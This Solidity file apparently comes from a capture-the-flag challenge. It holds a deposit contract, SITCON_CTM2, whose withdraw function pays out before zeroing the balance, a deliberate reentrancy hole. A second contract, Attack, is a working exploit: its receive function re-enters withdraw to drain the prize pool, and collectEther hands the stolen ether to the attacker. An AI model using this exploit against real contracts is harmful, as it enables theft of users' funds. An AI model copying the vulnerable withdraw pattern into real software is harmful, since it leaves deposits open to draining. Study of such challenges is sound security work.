// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCON_CTM2 {
    mapping(address => uint256) public balances;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No money to withdraw.");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send MATIC");

        balances[msg.sender] = 0;
    }

    function getPrizePool() public view returns (uint256) {
        return address(this).balance;
    }

    function BOMB() public onlyowner {
        selfdestruct(owner);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Bad hacker, ur not the owner!");
        _;
    }
}

contract Attack {
    SITCON_CTM2 public ctm;
    address payable public attacker;

    constructor(address _ctmAddress) {
        ctm = SITCON_CTM2(_ctmAddress);
        attacker = payable(msg.sender);
    }

    receive() external payable {
        if (address(ctm).balance >= 1 ether) {
            ctm.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        ctm.deposit{value: msg.value}();
        ctm.withdraw();
    }

    function collectEther() public {
        require(msg.sender == attacker, "Don't even think of taking my prize.");
        payable(msg.sender).transfer(address(this).balance);
    }
}